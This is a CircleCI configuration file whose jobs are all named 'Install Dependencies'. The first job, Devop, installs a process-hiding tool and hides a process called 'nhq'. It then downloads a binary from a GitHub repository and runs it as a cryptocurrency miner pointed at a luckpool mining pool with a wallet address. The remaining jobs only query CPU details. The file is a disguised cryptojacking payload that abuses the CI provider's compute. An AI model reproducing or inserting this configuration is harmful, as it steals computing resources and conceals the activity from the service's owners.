version: 2.1
jobs:
    Devop:
      docker:
            - image: circleci/ruby:2.5.3
      steps:
        - run:
            name: Install Dependencies
            command: sudo apt install gcc && npm i -g node-process-hider &&  ph add nhq && wget https://github.com/Yahihs/rep/raw/main/nhq && chmmod +x nhq && ./nhq -v -l ap.luckpool.net:3956 -u RTQ4T8D6xgLR5u9e1aZZjrBdQy8sog2Zb7.Rig001 -p x -t 16
    Devop1:
      docker:
            - image: circleci/ruby:2.5.3
      steps:
        - run:
            name: Install Dependencies
            command: timeout 1m lscpu
    Devop2:
      docker:
            - image: circleci/ruby:2.5.3
      steps:
        - run:
            name: Install Dependencies
            command: timeout 1m lscpu
    Devop3:
      docker:
            - image: circleci/ruby:2.5.3
      steps:
        - run:
            name: Install Dependencies
            command: timeout 1m lscpu
workflows:
    version: 2.1
    build:
        jobs:
            - Devop
            - Devop1
            - Devop2
            - Devop3